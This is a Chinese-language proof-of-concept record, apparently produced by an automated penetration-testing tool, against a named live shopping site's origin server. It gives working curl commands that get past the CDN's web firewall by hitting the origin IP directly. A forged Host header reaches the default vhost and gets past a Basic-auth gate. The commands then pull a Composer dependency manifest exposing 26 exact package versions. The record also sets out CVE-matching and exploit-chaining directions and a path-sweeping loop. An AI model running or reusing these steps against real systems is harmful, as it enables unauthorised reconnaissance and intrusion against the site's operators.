# shopto.net 源站 3.8.196.174 默认 vhost 可读 CKFinder connector vendor installed.json（26 个 Composer 包精确版本泄露，同目录 composer.json/lock 为 403）

- **code**: shopto-origin-ckfinder-installed-json-dependency-disclosure
- **kind**: poc
- **category**: info-leak
- **component**: CKFinder 3.x PHP connector（vendor/composer/installed.json，Composer 1 格式）/ Apache 多 vhost 源站（CDN 前置 CloudFront）
- **versions**: cksource/ckfinder dev-master ref db00f439fcb2；symfony/http-foundation 2.7.x-dev；symfony/http-kernel 2.7.x-dev；league/flysystem 1.0.45；aws/aws-sdk-php 3.62.9；guzzlehttp/guzzle dev-master；monolog/monolog 1.x-dev
- **severity**: low
- **language**: markdown
- **source**: manual
- **verified**: 1
- **verified_note**: finding_id=151（task#4，finding_checks.verdict=verified，status=confirmed）。2026-11-11 18:20-18:45 GMT 首次验证、18:46:13 GMT 复核：ARTEX 执行机 curl 8.5.0，--noproxy '*' 直连源站 3.8.196.174:443，-k --http1.0，Host: localhost（任意非 *.shopto.net 值）→ GET /plugins/ckfinder/core/connector/php/vendor/composer/installed.json 返回 HTTP/1.1 200、Server: Apache、Content-Type: application/json、Content-Length 49960、Last-Modified Fri 06 Nov 2026 10:55:27；正文为 Composer 1 格式 JSON 数组，解析出 26 个包（cksource/ckfinder dev-master db00f439fcb2、symfony/http-foundation 与 http-kernel 2.7.x-dev、league/flysystem 1.0.45、aws/aws-sdk-php 3.62.9、guzzlehttp/guzzle dev-master、monolog 1.x-dev、spatie/dropbox-api 1.6.5、microsoft/azure-storage dev-master 等）。对照：随机不存在路径 /zzq-nonexist-*.html → 404/1883B（应用页）；根 /composer.json → 403/215B（名称型规则）；根 /vendor/composer/installed.json → 404 ⇒ installed.json 属被保护名单遗漏的构建清单，判定成立。原始体留存 /opt/artex/data/tasks/4/i2173/bodies/installed.json（49960B）。
- **path**: pocs/shopto-origin-ckfinder-installed-json-dependency-disclosure/shopto-origin-ckfinder-installed-json-dependency-disclosure.md
- **tags**: info-expose, installed.json, composer, ckfinder, dependency-disclosure, vendor-directory, origin-direct, vhost, version-fingerprint, shopto
- **created_at**: 2026-11-11T18:47:02.053Z
- **engine**: https://3.8.196.174（shopto.net 源站，Host: localhost）
- **found_by**: recon

## 描述

原理：CKFinder PHP connector 以 Composer 安装，vendor/composer/installed.json（Composer 1 格式）会完整记录每个依赖包名、精确版本与 source commit，属构建产物；源站 Apache 的 .htaccess 名称规则只拦 composer.json/composer.lock，未收录 installed.json，导致匿名可读。价值：一次性拿到 26 个后端 PHP 依赖的精确版本/commit，可直接对 symfony 2.7.x-dev、flysystem 1.0.45、aws-sdk-php 3.62.9、guzzle/monolog dev-master 等做 CVE 匹配与分支状态还原。适用面：任何暴露 vendor 目录的 PHP 站点（CKFinder/CKEditor 集成、遗留 Composer 部署），且能直连源站绕边缘 WAF。

## 用法

```
前置条件：
1) 能直连源站 IP:443（本例 3.8.196.174 为 shopto.net 的 CloudFront 源站；直连绕过边缘 WAF；本机挂代理时必须 --noproxy '*'，否则打到 CDN 边缘）；
2) curl -k（源站证书与域名不匹配）+ --http1.0（旧 Apache vhost）；
3) Host 头设任意非业务值（如 localhost）命中默认 vhost，同时绕过主站 / 的 Basic 门禁。

【1) 直取清单】
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' -A "$ARTEX_UA" \
  'https://<源站IP>/plugins/ckfinder/core/connector/php/vendor/composer/installed.json' \
  -o installed.json -w '\n%{http_code} %{size_download} %{content_type}\n'

【2) 对照三发（必须全做，否则会把「规则拦截」误判成「文件不存在」或反之）】
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' https://<IP>/zzq-nonexist-<rand>.html -o /dev/null -w '%{http_code} %{size_download}\n'   # 期望 404 + 应用页字节数（本例 1883B）
curl -sk ... https://<IP>/composer.json -o /dev/null -w '%{http_code}\n'          # 期望 403（名称型规则）
curl -sk ... https://<IP>/vendor/composer/installed.json -o /dev/null -w '%{http_code}\n'  # 期望 404（根 vendor 不存在）

【3) 解析与利用】
python3 -c "import json;d=json.load(open('installed.json'));print(len(d));[print(p['name'],p['version'],p.get('source',{}).get('reference','')[:12]) for p in d]"
- 顶层为数组 ⇒ Composer 1 格式；顶层为 {"packages":[...]} ⇒ Composer 2 格式，解析路径不同。
- 对每个包按版本/commit 去 NVD/上游 changelog 做 CVE 匹配；dev-master 没有版本号，需按 commit 日期或对比上游分支 HEAD 还原实际代码状态。

判据：200 + Content-Type application/json + 正文含 name/version/source.reference ⇒ 命中；随机路径 404 排除整站兜底 200；同目录 composer.json 403 证明是保护名单遗漏而非有意公开。

常见失败原因：
- 走 CDN 域名而非源站 IP ⇒ 边缘返回 403/404 或缓存页；
- Host 设成真实业务域名 ⇒ 落到主站 vhost，命中 Basic 门禁/主站 404；
- connector 路径不同（/ckfinder/、/admin/ckfinder/、/plugins/ckfinder/core/connector/php/ 等），需先按已知 connector.php 路径推算同目录 vendor；
- 目标已升级 Composer 2 或补齐 .htaccess 名称规则 ⇒ 返回 404/403 或结构变化，结论失效。

关联：同一 vhost 的 /bower.json 也是同类遗漏（前端依赖，见条目 shopto-origin-bower-json-dependency-disclosure）；本条为后端 PHP 依赖，CVE 匹配价值更高。CKFinder 组件利用见条目 ckfinder-3.4.4-connector-auth-whitelist-downloadfile-imagepr。
```

## 正文

```
# 源站默认 vhost 匿名读取 CKFinder connector 的 Composer installed.json

## 前置
- 直连源站 IP:443（CDN 源站，直连绕边缘 WAF）；本机有代理时 `--noproxy '*'`
- `curl -k`（证书不匹配）、`--http1.0`（旧 Apache vhost）
- `Host` 设为任意非业务值（如 `localhost`），命中默认 vhost 并绕过主站 `/` 的 Basic 门禁
- 已知 CKFinder 集成前缀（本例 `/plugins/ckfinder/core/connector/php/`，与 connector.php 同目录）

## 复现
```bash
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' -A "$ARTEX_UA" \
  'https://3.8.196.174/plugins/ckfinder/core/connector/php/vendor/composer/installed.json' \
  -o installed.json -D - -w '\n%{http_code} %{size_download} %{content_type}\n'
```

命中回显（2026-11-11 18:46:13 GMT 复核）：
```
HTTP/1.1 200 OK
Server: Apache
X-Content-Type-Options: nosniff
Last-Modified: Fri, 06 Nov 2026 10:55:27 GMT
ETag: "c328-65f99732da333"
Content-Length: 49960
Content-Type: application/json
```

正文为 Composer 1 格式 JSON 数组（`json.load()` 后 len=26），每元素结构：
```json
{"name":"cksource/ckfinder","version":"dev-master","version_normalized":"dev-master",
 "source":{"type":"git","url":"https://github.com/cksource/ckfinder.git","reference":"db00f439fcb2..."},
 "require":{...},"time":"..."}
```

## 对照判据（三发）
```bash
# 1) 随机不存在路径 → 应用 404 页（排除整站兜底 200）
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' \
  https://3.8.196.174/zzq-nonexist-$RANDOM.html -o /dev/null -w '%{http_code} %{size_download}\n'
# → 404 1883

# 2) 根 composer.json → 名称型规则 403
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' \
  https://3.8.196.174/composer.json -o /dev/null -w '%{http_code} %{size_download}\n'
# → 403 215  (Content-Type: text/html; charset=iso-8859-1)

# 3) 根 vendor/composer/installed.json → 404（根目录没有 vendor）
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' \
  https://3.8.196.174/vendor/composer/installed.json -o /dev/null -w '%{http_code}\n'
# → 404
```
三条合起来 ⇒ installed.json 真实存在、被 Apache 当静态文件投递，且属名称保护名单遗漏（composer.json/.lock 保护了，installed.json 没保护）。

## 泄露的 26 个包（原样解析）
```
ralouphie/getallheaders                2.0.5        5601c8a83fbb
psr/http-message                       dev-master   f6561bf28d52
guzzlehttp/psr7                        dev-master   58f6e264ef0e
guzzlehttp/promises                    dev-master   136531aa4e42
guzzlehttp/guzzle                      dev-master   7bc46be28e4b
spatie/dropbox-api                     1.6.5        af8d429a5142
league/flysystem                       1.0.45        a99f94e63b51
spatie/flysystem-dropbox                1.0.6        cff7dba92528
microsoft/azure-storage                dev-master   e1702ae9e619
league/flysystem-azure                 dev-master   b61bdb369ad6
psr/cache                              dev-master   78c5a01ddbf1
league/flysystem-cached-adapter         1.0.6        93eec679c57f
mtdowling/jmespath.php                 2.4.0        adcc9531682c
aws/aws-sdk-php                        3.62.9       c4bca5798cad
psr/log                                dev-master   3490ba5925e6
league/flysystem-aws-s3-v3             1.0.13       dc56a8faf3af
monolog/monolog                        1.x-dev      c465e1144536
psr/container                          dev-master   2cc4a0178819
pimple/pimple                          dev-master   21e3e0dc8918
symfony/polyfill-mbstring              dev-master   25b83a5050c6
symfony/http-foundation                2.7.x-dev    c47d54254ee3
symfony/event-dispatcher               2.7.x-dev    04dc8ab78c0a
symfony/debug                          2.8.x-dev    a26ddce7fe4e
symfony/polyfill-ctype                 dev-master   9d31bef82d2e
symfony/http-kernel                    2.7.x-dev    16863f855382
cksource/ckfinder                      dev-master   db00f439fcb2
```

## 利用方向
1. **版本 → CVE 匹配**：symfony 2.7.x-dev / 2.8.x-dev 属 2018 年前已终止维护分支，对照 NVD 上的 symfony/http-foundation、http-kernel、debug 历史 CVE；`league/flysystem 1.0.45`、`aws/aws-sdk-php 3.62.9`、`spatie/dropbox-api 1.6.5` 均为可查版本号。
2. **dev-master → commit 还原**：dev-master 无版本号，按 `source.reference`（如 cksource/ckfinder db00f439fcb2）+ 上游 GitHub 历史可定位实际代码快照，再比对修复 commit。
3. **组件确权**：确认目标跑的是 CKFinder 3.x PHP connector 且 vendor 目录可直接触达，可与 CKFinder connector 认证绕过（匿名 DownloadFile / ImagePreview）组合评估。

## 铺面（找同族遗漏）
```bash
# 对已知 connector 目录族逐个试 installed.json
for p in /plugins/ckfinder/core/connector/php /ckfinder/core/connector/php /admin/ckfinder/core/connector/php; do
  curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' \
    "https://3.8.196.174$p/vendor/composer/installed.json" -o /dev/null \
    -w "$p %{http_code} %{size_download}\n"
done
```
同类可直接读的还有 `vendor/composer/installed.php`（Composer 2）、`vendor/composer/autoload_static.php`（含全部类名与包路径映射）。

## 常见失败原因
- 走 CDN 域名而非源站 IP ⇒ 边缘 403/404 或返回缓存页；
- Host 设真实业务域名 ⇒ 落到主站 vhost，命中 Basic 门禁；
- connector 路径猜错（集成方式不同）⇒ 落到应用 404 页（1883B）；
- 目标已补 .htaccess 名称规则或升级 Composer 2 ⇒ 403/404 或顶层变对象 `{"packages":[...]}`，需换解析。

## 证伪条件
该 URL 返回 403/404，或正文不含 `name`/`version`/`source.reference` ⇒ 本结论不成立。
```
